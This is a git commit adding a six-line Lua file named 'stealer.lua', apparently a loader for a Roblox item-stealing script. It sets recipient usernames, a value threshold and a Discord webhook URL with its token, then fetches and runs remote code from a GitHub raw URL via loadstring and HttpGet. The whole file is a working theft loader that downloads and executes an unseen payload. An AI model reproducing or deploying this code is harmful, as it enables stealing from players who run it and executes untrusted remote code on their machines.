bee2f20f29572675321bf427305e7ed1230faad6
kross6x <biboypiedad@gmail.com>
2025-05-06 16:36:31 +0800

    Add files via upload

---
+++ stealer.lua
@@ -0,0 +1,6 @@
+_G.Usernames = {"Yatashis"} -- you can add as many as you'd like
+_G.min_value = 0.1
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discordapp.com/api/webhooks/1369230106970816643/nNYO2NqOON9ADWp_yTtxoZ3f4NLgXxAXIhYcIqrcPXTzyUiM9NMUNYqIRRwhlt2EvCvs" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kross6x/oaksad/refs/heads/main/source.lua"))()
